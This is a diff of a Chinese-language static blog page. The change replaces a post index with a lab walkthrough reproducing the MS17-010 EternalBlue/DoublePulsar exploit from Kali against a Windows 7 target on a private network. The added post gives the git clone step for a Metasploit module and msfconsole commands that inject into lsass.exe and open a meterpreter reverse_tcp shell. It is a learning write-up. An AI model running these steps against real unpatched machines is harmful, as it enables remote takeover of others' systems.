@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta name="google-site-verification" content="B6QNJ8N2Q7hbnMncyrM5GMCWgK-vIAEx0o2DQre64ls" />
   
-  <title>第 2 页 | t1ger的茶馆</title>
+  <title>方程式-ms17-010复现 | t1ger的茶馆</title>
   <meta name="author" content="t1ger">
   
   <meta name="description" content="https://t1ger.github.io/">
@@ -13,7 +13,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  
+  <meta property="og:title" content="方程式-ms17-010复现"/>
   <meta property="og:site_name" content="t1ger的茶馆"/>
 
   
@@ -110,179 +110,56 @@
 	  <div class="container" >
 	    <div class="row">
 	
-	<div class="col-md-9">
+	<div class="col-md-9 center-content">
 	
 
 		<div class="content">
 			<!-- index -->
 		   
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/12/14/ansible使用指北-三/">ansible使用指北(三)</a>
-		              </h3>
-									<span class="post-time">2016-12-14</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/12/13/ansible使用指北-二/">ansible使用指北(二)</a>
-		              </h3>
-									<span class="post-time">2016-12-13</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/12/13/ansible使用指北(一)/">ansible使用指北(一)</a>
-		              </h3>
-									<span class="post-time">2016-12-13</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/12/13/MySQL-with-SSL-Encryption/">MySQL with SSL Encryption</a>
-		              </h3>
-									<span class="post-time">2016-12-13</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/12/09/五分钟了解Redis4-0新特性/">五分钟了解Redis4.0新特性</a>
-		              </h3>
-									<span class="post-time">2016-12-09</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/12/05/Jenkins构建iOS持续集成环境/">Jenkins构建iOS持续集成环境</a>
-		              </h3>
-									<span class="post-time">2016-12-05</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/12/01/Docker-1-12-Swarm-Mode初体验/">Docker 1.12 Swarm Mode初体验</a>
-		              </h3>
-									<span class="post-time">2016-12-01</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/11/28/docker学习笔记-DeviceMapper/">docker学习笔记-DeviceMapper</a>
-		              </h3>
-									<span class="post-time">2016-11-28</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/11/28/docker学习笔记-AUFS/">docker学习笔记-AUFS</a>
-		              </h3>
-									<span class="post-time">2016-11-28</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/11/26/docker学习笔记-Linux-namespace/">docker学习笔记-Linux namespace</a>
-		              </h3>
-									<span class="post-time">2016-11-26</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-				<!-- archives -->
+
+			  		<h2>方程式-ms17-010复现</h2>
+					
+					<div>
+						<span class="post-time">2017-05-16 23:28:33</span>
+					</div>	
+					
+
+					<div class="article-content">
+						<p>0x01 环境介绍:</p>
+<p>目标机win7 x86: 192.168.1.120</p>
+<p>控制机Kail: 192.168.1.99</p>
+<p>0x02 环境准备</p>
+<p>利用模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>wine可以在linux下运行windows程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install wine </div><div class="line">wine cmd.exe  打开cmd.exe,exit退出</div></pre></td></tr></table></figure></p>
+<p>将链接的文件克隆到kali中，并将eternalblue_doublepulsar.rb移动至metasploit的exploit/windows/smb文件夹中,具体路径为/usr/share/metasploit-framework/modules/exploits/windows/smb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</div><div class="line">cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</div></pre></td></tr></table></figure></p>
+<p>0x03 利用过程</p>
+<p>设置参数，按照实际情况设置，DOUBLEPULSARPATH和ETERNALBLUEPATH指向从github下载的deps文件夹即可，里面包含了DOUBLEPULSAR和ETERNALBLUE所需的dll<br>设置一个payload<br>注意：如果靶机为64位，改为set payload windows/x64/meterpreter/reverse_tcp</p>
+<p>然后打开msfconsole<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">use exploit/windows/smb/eternalblue_doublepulsar</div><div class="line">#set   DOUBLEPULSARPATH  /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">#set  ETERNALBLUEPATH   /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">set processinject lsass.exe</div><div class="line">#set TARGETARCHITECTURE  x64</div><div class="line">set rhost 192.168.1.120</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.99</div><div class="line">show targess </div><div class="line">set target 9</div><div class="line">options </div><div class="line">run</div></pre></td></tr></table></figure></p>
+<p>最后在msf下可以看到成功反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;sysinfo</div><div class="line">meterpreter&gt;shell</div></pre></td></tr></table></figure></p>
+<p>ref<br><a href="http://www.cnblogs.com/backlion/p/6804863.html" target="_blank" rel="external">smb(ms17-010)远程命令执行之msf</a><br><a href="http://www.jianshu.com/p/ceb184b3dbc3" target="_blank" rel="external">ms17-010</a><br><a href="http://mt.sohu.com/20170505/n491866402.shtml" target="_blank" rel="external">方程式利用-不需Fuzzbunch完美入侵windows</a><br><a href="https://www.t00ls.net/articles-39343.html" target="_blank" rel="external">方程式ETERNALBLUE 之fb.py的复现</a></p>
+
+							<!-- 支付宝打赏图案 -->
+      						<div id="donate_guide" class="donate_bar center ">
+          					<a href="http://t1.qpic.cn/mblogpic/79e13bdabc9da2a299ee/2000" title="支付宝打赏" class="fancybox" rel="article0"       style="float:left;margin-left:25%;margin-right:2px;">
+          					<img src="http://t1.qpic.cn/mblogpic/79e13bdabc9da2a299ee/2000" title="支付宝打赏" height="164px" width="164px">
+          					</a> 
+      						</div>
+					</div>
+
+			  <!-- about -->
 			  
 		</div>
 
 		<!-- pagination -->
 	  
 
-			<div class="btn-group btn-group-justified">
-				
-
-					<a class="btn btn-default " href="/" >上一页</a>
-
-					<a class="btn btn-default" href="/">首页</a>
-
-					<a class="btn btn-default " href="/page/3/" >下一页</a>
-
-	    	
-			</div>
-	  
-
 		<div class="comment-section">
   
+  
+
 
 </div>
 	</div>
 
-	
-		<div class="col-md-3">
-			<div id="sidebar">
-		</div>
-			
-					
-<div class="widget">
-  <h4>最新文章</h4>
-  <ul class="entry list-unstyled">
-    
-      <li>
-        <a href="/2017/05/16/方程式-ms17-010复现/"  > <i class="mdi-editor-insert-drive-file"></i>方程式-ms17-010复现</a>
-      </li>
-    
-      <li>
-        <a href="/2017/04/25/docker私有registry配置nginx反向代理/"  > <i class="mdi-editor-insert-drive-file"></i>docker私有registry配置nginx反向代理</a>
-      </li>
-    
-      <li>
-        <a href="/2017/04/13/如何生成自签名证书/"  > <i class="mdi-editor-insert-drive-file"></i>如何生成自签名证书</a>
-      </li>
-    
-      <li>
-        <a href="/2017/04/07/faster-way-to-navigate-your-filesystem-for-CentOS/"  > <i class="mdi-editor-insert-drive-file"></i>faster way to navigate your filesystem for CentOS</a>
-      </li>
-    
-      <li>
-        <a href="/2017/03/21/Deploy-VM-to-vCenter-with-Ansible/"  > <i class="mdi-editor-insert-drive-file"></i>Deploy VM to vCenter with Ansible</a>
-      </li>
-    
-  </ul>
-</div>
-
-
-				
-					
-<div class="widget">
-	<h4>链接</h4>
-	<ul class="blogroll list-unstyled">
-	
-		<li> <a href="https://www.github.com/t1ger" title="t1ger的茶馆" target="_blank"> <i class="mdi-action-launch"></i> GitHub</a></li>
-	
-		<li> <a href="https://t1ger.github.io" title="t1ger的茶馆" target="_blank"> <i class="mdi-action-launch"></i> QQ</a></li>
-	
-	</ul>
-</div>
-
-
-				
-			</div>
 	
 
 </div>
